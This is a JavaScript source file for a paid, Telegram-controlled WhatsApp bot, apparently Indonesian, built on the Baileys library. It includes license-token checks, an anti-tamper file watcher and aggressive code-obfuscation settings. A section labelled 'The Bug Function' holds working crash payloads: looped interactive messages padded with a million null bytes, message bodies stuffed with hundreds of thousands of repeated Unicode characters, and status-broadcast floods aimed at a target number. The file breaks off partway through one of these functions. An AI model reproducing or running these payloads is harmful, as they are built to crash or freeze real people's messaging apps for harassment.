const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage,ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage,WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const chalk = require("chalk");
const axios = require("axios");
const JsConfuser = require("js-confuser");
const P = require("pino");
const renlol = fs.readFileSync('./⎋ Asset/images/thumb.jpeg');
const sessions = new Map();
const readline = require('readline');
const dns = require("dns");
const cd = "cooldown.json";
const { BOT_TOKEN, GROUP_ID, GROUP_LINK } = require("./⎋ Settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/UcihaOfficial/NuxxOri/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (!response.data) {
      return [];
    }

    return Array.isArray(response.data)
      ? response.data
      : response.data.tokens || [];
  } catch (error) {
    console.error("Gagal mengambil token:", error.message);
    return [];
  }
}

// =========== ( anti bypas by Uciha ) ==============
const mainFile = process.argv[1] || path.resolve(process.cwd(), "index.js");
let originalContent = null;
let originalHash = null;
const backupDir = path.join(process.cwd(), ".npm");
const backupPath = path.join(backupDir, ".bak");

try {
  if (!fs.existsSync(mainFile)) {
    console.warn(chalk.yellow(`[ SYSTEM ] Main file tidak ditemukan: ${mainFile}. ANTI-BYPASS dinonaktifkan.`));
  } else {
    originalContent = fs.readFileSync(mainFile);
    originalHash = crypto.createHash("sha256").update(originalContent).digest("hex");

    if (!fs.existsSync(backupDir)) {
    fs.mkdirSync(backupDir, { recursive: true });
    }

    fs.writeFileSync(backupPath, originalContent, { flag: "w" });
    console.log(chalk.greenBright(`[ SYSTEM ] Backup main file tersimpan ke: ${backupPath}`));
  }
} catch (e) {
  console.error(chalk.redBright("[ SYSTEM ] Gagal baca main file / buat backup:"), e.message);
  originalContent = null;
  originalHash = null;
}

async function restoreFile() {
  try {
    console.log(chalk.greenBright("[ SYSTEM ] Restore main file..."));
    if (fs.existsSync(backupPath)) {
      fs.copyFileSync(backupPath, mainFile);
      await notifyOwnerSafe("⚠️ File utama dimodifikasi, restore otomatis!", null, false).catch(()=>{});
      console.log(chalk.greenBright("[ SYSTEM ] Restore berhasil."));
    } else {
      console.error(chalk.redBright("[ SYSTEM ] Backup tidak ditemukan!"));
      await notifyOwnerSafe("⚠️ File utama dimodifikasi tetapi backup tidak ditemukan!", null, false).catch(()=>{});
    }
  } catch (e) {
    console.error(chalk.redBright("[ SYSTEM ] Gagal restore:"), e.message);
    await notifyOwnerSafe("⚠️ Gagal restore: " + e.message, null, false).catch(()=>{});
  } finally { process.exit(1); }
}

// safe hash
function fileHashSafe(p) {
  try {
    if (!fs.existsSync(p)) return null;
    const c = fs.readFileSync(p);
    return crypto.createHash("sha256").update(c).digest("hex");
  } catch(e) { console.error(chalk.yellow("[ SYSTEM ] Gagal baca file untuk hash:"), e.message); return null; }
}

// cek perubahan file
if (originalHash) {
  setInterval(async () => {
    try {
      const currentHash = fileHashSafe(mainFile);
      if (currentHash && currentHash !== originalHash) {
        console.log(chalk.redBright("[ SYSTEM ] Main file modified!"));
        await notifyOwnerSafe("🚨 Bypass terdeteksi: File utama dimodifikasi!", null, false).catch(()=>{});
        await restoreFile();
      }
    } catch(e) { console.error(chalk.redBright("[ SYSTEM ] Error saat cek main file:"), e.message); }
  }, 2000);
} else {
  console.warn(chalk.yellow("[ SYSTEM ] originalHash tidak tersedia — deteksi perubahan file dinonaktifkan."));
}

console.log(chalk.greenBright
("[ SYSTEM ] PROCESSING... ANTI-BYPASS ACTIVE"));
// ============== end anti bypas =============

async function validateToken() {
    console.log("SABAR GW LAGI CEK TOKEN LU");

    const validTokens = await fetchValidTokens();

    console.log("VALID TOKENS:", validTokens);

    if (!Array.isArray(validTokens)) {
        console.log("Database token tidak valid");
        process.exit(1);
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log("KELAZZ NYOLONG DARI MANA LU BELI BOY HARGA MURAH PADAHAL © UCIHABOYS");
        process.exit(1);
    }

    console.log("TERIMAKASIH SUDAH MEMBELI YAA");
    startBot();
    initializeWhatsAppConnections();
}
function startBot() {
 console.log(chalk.cyanBright(`
   ⢸⣦⡀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⠻⣶⣤⡶⢾⡿⠁⠀⢠⣄⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀
⠀⠀⣀⣼⠷⠀⠀⠁⢀⣿⠃⠀⠀⢀⣿⣿⣿⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣯⣅⣀⠀⠀⠀⠈⢻⣦⡀⠒⠻⠿⣿⡿⠿⠓⠂⠀⠀⢂⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⡇⣤⣾⣿⣷⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⡿⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⡿⢻⣿⡆⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣼⠀⠀⠀⠹⣿⣟⠿⠿⠿⡿⠋⠀⠘⣿⣇⠀⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣇⣀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣠⣽⣿⡿⠟⠃
⠀⠀⠀⠈⠀⢰⠿⠛⠻⢿⡇⠀⠀⠀⣰⣿⠏⠀⠀⢀⠀⠀⠁⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣾⣿⠿⢿⣷⣀⢀⣿⡇⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠋⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀
═══════════════════════════
Status : Succes Connected!
Developer : All Team Nuxx\n
`));

console.log(chalk.red(`
[ ----- 🛡️ ----- ]
`
));
};

// Panggil function sebelum menjalankan bot
validateToken(BOT_TOKEN);

// Pastikan file premium & admin ada
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./⎋ Settings/premium.json');
ensureFileExists('./⎋ Settings/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./⎋ Settings/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./⎋ Settings/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./⎋ Settings/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./⎋ Settings/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./⎋ Settings/premium.json', (data) => (premiumUsers = data));
watchFile('./⎋ Settings/admin.json', (data) => (adminUsers = data));

// Nama file untuk menyimpan ID pengguna
const USER_IDS_FILE = './⎋ Settings/userids.json';

// Fungsi untuk membaca daftar ID pengguna dari file
function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}

// Fungsi untuk menyimpan daftar ID pengguna ke file
function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

// Set untuk menyimpan ID pengguna unik
const userIds = new Set(readUserIds());

// Fungsi untuk menambahkan ID pengguna baru
function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 sᴛᴀᴛᴜs : Loading...\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
      `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 sᴛᴀᴛᴜs : Menghubungkan...\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
      `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 sᴛᴀᴛᴜs : Disconnected!\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
      `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 sᴛᴀᴛᴜs : Success Connected!\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
       let customCode = "NVXPRIME"
       const code = await sock.requestPairingCode(botNumber, customCode);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 ᴄᴏᴅᴇ : ${formattedCode}\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
      `\`\`\`🩸
  「 𖥂 」𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 Pairing「 𖥂 」
──────────────────────────
  👀 ɴᴜᴍʙᴇʀ  : ${botNumber}              
  🤖 sᴛᴀᴛᴜs : Error Connect!\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ---------- ( Function Obfuscation ) ---------- //
const getNewObfuscationConfig = () => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
})

const getUltraObfuscationConfig = () => {
    const generateUltraName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz"
        const numbers = "0123456789"
        const randomNum = numbers[Math.floor(Math.random() * numbers.length)]
        const randomChar = chars[Math.floor(Math.random() * chars.length)]
        return `z${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`
    }

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateUltraName,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9,
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    }
}
    
const obfuscateQuantum = async (fileContent) => {
    const generateTimeBasedIdentifier = () => {
        const timeStamp = Date.now().toString().slice(-5)
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*"
        let identifier = "qV_"
        for (let i = 0; i < 7; i++) {
            identifier += chars[
                (parseInt(timeStamp[i % 5]) + i * 2) % chars.length
            ]
        }
        return identifier
    }

    const currentMilliseconds = new Date().getMilliseconds()
    const phantomCode =
        currentMilliseconds % 3 === 0
            ? `if(Math.random()>0.999)console.log('PhantomTrigger');`
            : ""

    const obfuscated = await JsConfuser.obfuscate(
        fileContent + phantomCode,
        {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            stringEncoding: true,
            stringCompression: true,
            controlFlowFlattening: 0.85,
            opaquePredicates: {
                count: 8,
                complexity: 5
            },
            deadCode: true,
            dispatcher: true,
            globalConcealing: true,
            duplicateLiteralsRemoval: true
        }
    )

    let code = obfuscated.code || obfuscated
    if (typeof code !== "string") {
        throw new Error("Hasil obfuscation bukan string")
    }

    // XOR self-evolving layer
    const key = currentMilliseconds % 256
    code =
        `(function(){let k=${key};` +
        `return function(c){return c.split('').map((x,i)=>` +
        `String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('')}` +
        `('${code}');})()`

    return code
}

const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        const prefixes = ["KingTrixie", "newsnuxx", "Trixie4me"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];

        const hash = crypto
            .createHash("sha256")
            .update(crypto.randomBytes(8))
            .digest("hex")
            .slice(0, 6);

        const suffix = Math.random().toString(36).slice(2, 5);
        return `${randomPrefix}_${hash}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNovaName,
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5,
        flatten: true,
        shuffle: true,
        rgf: false,
        deadCode: false,
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const createProgressBar = (percent) => {
    const total = 20;
    const filled = Math.round((percent / 100) * total);
    const empty = total - filled;
    return "█".repeat(filled) + "░".repeat(empty) + ` ${percent}%`;
};

const updateProgress = async (bot, chatId, messageId, percent, status) => {
    const text =
        "```All Team Nuxx\n" +
        "🔒 Starting Encrypted...\n" +
        ` ⚙️ ${status} (${percent}%)\n` +
        " " + createProgressBar(percent) + "\n" +
        "```";

    await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
    });
};

async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", new Blob([fileBuffer]), filename);

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  const text = await res.text();
  if (!res.ok || text.startsWith("ERROR")) {
    throw new Error("Upload gagal: " + text);
  }
  return text.trim();
}

async function tiktok(url) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", url);
    encodedParams.set("hd", "1");

    const response = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "current_language=en",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
    });

    if (!response.data || !response.data.data) {
      throw new Error("Gagal mendapatkan data TikTok");
    }

    const videos = response.data.data;
    return {
      title: videos.title,
      cover: videos.cover,
      origin_cover: videos.origin_cover,
      no_watermark: videos.play,
      watermark: videos.wmplay,
      music: videos.music,
    };
  } catch (error) {
    throw error;
  }
}
// -------( Fungsional Function Before Parameters )--------- 
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
       "https://image2url.com/r2/default/images/1775719220807-e76e4e61-164e-4cc9-a3e1-9c24d7767606.jpg",
       "https://files.catbox.moe/wpz63f.jpg",
       "https://files.catbox.moe/wpz63f.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}


// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
// ---------( The Bug Function )---------- //
async function xdlyV2(target) {
for(let p = 0; p < 100; p++) {
await socket.relayMessage(target, {
  interactiveMessage: {
    header: {
      hasMediaAttachment: true,
      "imageMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQPlXiwc4dNw0zf0I9iIxFyN8gOS0-hbXrcKDj_uFvH2kSurGRfVAcpQ1pteU-Yqf_Baz518_4SrKMM0hA8Uyq1R8Pyr6va6rxIMWRWaHQ?ccb=9-4&oh=01_Q5Aa4gFcTrWZYDW6CchMOP5XFMz2OXjnWk6o1guDNTstqie-EQ&oe=6A420293&_nc_sid=e6ed6c&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "EGn+cDdTvv1YrurEcbbLsGByOwTMkU4pS/3NQZ7kr9I=",
    "fileLength": "15984",
    "height": 480,
    "width": 480,
    "mediaKey": "YMmKrsS3S6ehWezeFUW+/oMel0ZeP1iNTPFNfAVQN50=",
    "fileEncSha256": "u39+VOBtpC3xhys340FOG0QRN+2fbYi6DZ1yWQs2OLw=",
    "directPath": "/o1/v/t24/f2/m232/AQPlXiwc4dNw0zf0I9iIxFyN8gOS0-hbXrcKDj_uFvH2kSurGRfVAcpQ1pteU-Yqf_Baz518_4SrKMM0hA8Uyq1R8Pyr6va6rxIMWRWaHQ?ccb=9-4&oh=01_Q5Aa4gFcTrWZYDW6CchMOP5XFMz2OXjnWk6o1guDNTstqie-EQ&oe=6A420293&_nc_sid=e6ed6c",
    "mediaKeyTimestamp": "1780127932",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAPAMBIgACEQEDEQH/xAAwAAEAAgMBAAAAAAAAAAAAAAAABAUBAgYDAQEAAwEAAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5kBnc82+gAm6dPE1Ub0r8+2f6wLma8959JzmnFm/57K15W53z6ljXRpzkQS+AAAAH//EACYQAAICAgEDAgcAAAAAAAAAAAECAAMEETEQEiEiURQgMDJAQmH/2gAIAQEAAT8A+kATBU5/Uwow5B+XGw3v/gj11Y4CqAWhf3MV/cAiWYKWp31R62rYgjpiVLbaATERUQBRLie9zLHBAGvMoYkTCPpYTOx0dC/BEMVihBExc5XAV+Zk16csODHqG9xFI8KJXvHrJcgbmTltb6QfHUEiV5liDR8iDIqPKmfFhfsSWXPYdsfw/wD/xAAdEQEAAQMFAAAAAAAAAAAAAAABAgAQIBESITJB/9oACAECAQE/AMey1FSWl9qPFRj65f/EAB0RAAICAgMBAAAAAAAAAAAAAAECAAMRIBAiMUH/2gAIAQMBAT8AmNCVoReuSZcqvULAMHkWoyBX+S20MAq+bf/Z",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "IMAGE"
    },
    "scansSidecar": "tzpTbhV67OZVtNP30jo/OlSTouWW8fE9tV37e4kd/oOfyNJH2xlWmQ==",
    "scanLengths": [
      1860,
      6466,
      2531,
      5127
    ],
    "midQualityFileSha256": "Nbj86KbMGmOTSxXx4bHGyOR3LiSRfDkpyVicwD/AN+g="
  }
    },
    body: {
      text: "UcihaBoys.js"
    },
    nativeFlowMessage: {
      buttons: [
        {
          name: "inapp_signup",
          buttonParamsJson: "\0".repeat(1000000)
        }
      ]
    },
    contextInfo: {}
  }
}, {})
}
}

async function bebasspamwoyanjeng(sock, target) {
const ajeng = "woy lu kenal gw?, aku suka kamu🤧".repeat(10000);
const acengoy = {
  viewOnceMessage: {
   message: {
    internativeResponseMessage: {
     body: {
      text: ajeng,
      format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
           buttons: [
           {
             name: "single_select",
             buttonParamsJson: JSON.stringify({
              title: "Select Option",
              sections: [{
               title: "UCIHA NIH BOS",
                rows: [{
                 id: "Ampas Wa Lu Bangsat",
                 title: "Jadilah Manusia Yang Berguna"
                }]
              }]
            })
          },
          {
            name: "flow",
            buttonParamsJson: JSON.stringify({
              display_text: ajeng,
              flow_id: "Ampas"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: ajeng,
              id: "?"
            })
          },
          {
            name: "cta_call",
            buttonParamsJson: JSON.stringify({
              display_text: ajeng,
              phone_number: "+62010101010"
             })
           }
         ]
       }
     }
   }
}
};
await sock.relayMessage(target, acengoy, {
  participant: { jid: target }
  });
}

async function FrezeSange(sock, target) {   
  const nanzewe = [
      "address_message", 
      "galaxy_message",
      "call_permission_request",
      "cta_url",
      "cta_reminder"
   ];
  const legensnaz = "𑇂𑆵𑆴𑆿".repeat(80000) + "ꦽ".repeat(250000);
  let nanzfreze = {
    viewOnceMessage: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "Uciha Anti Ampas",
             format: 1
           },
           nativeFlowResponseMessage: {
             name: nanzewe[0], 
             paramsJson: legensnaz,
             url: "https://t.me/nanzlyora",
             version: 3,
           },
         },
       },
     },
   };

                                                
  await sock.relayMessage(target, nanzfreze, { 
    participant: { jid: target } 
  });
}

async function annotationz(target) {
  for (let z = 0; z < 100; z++) {
    await sock.relayMessage("status@broadcast", {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",
        fileLength: "3557776",
        seconds: 19,
        mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",
        height: 480,
        width: 480,
        fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",
